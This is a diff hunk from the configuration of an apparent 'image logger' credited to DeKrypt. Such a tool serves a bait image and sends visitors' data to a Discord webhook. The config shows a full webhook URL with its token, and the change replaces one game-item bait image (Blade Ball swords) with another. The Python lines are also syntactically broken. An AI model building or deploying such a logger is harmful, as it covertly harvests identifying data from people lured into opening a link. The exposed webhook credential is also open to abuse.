@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
 "webhook": "https://discord.com/api/webhooks/1487819653530255516/zFtrIr72ORYqsm7RFNijx9AUhBCl0DSb5wkSnN8UI8uAtRyJm8vwzImedyv1uSTKipP0"
-    "image": ""https://media.karousell.com/media/photos/products/2024/11/20/blade_ball_swords_1732106547_f1c1af34.jpg", 
+    "image": ""https://cdn-offer-photos.zeusx.com/4e02ba51-a358-4970-8b3e-b699e9981f7e.jpg", 
     # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
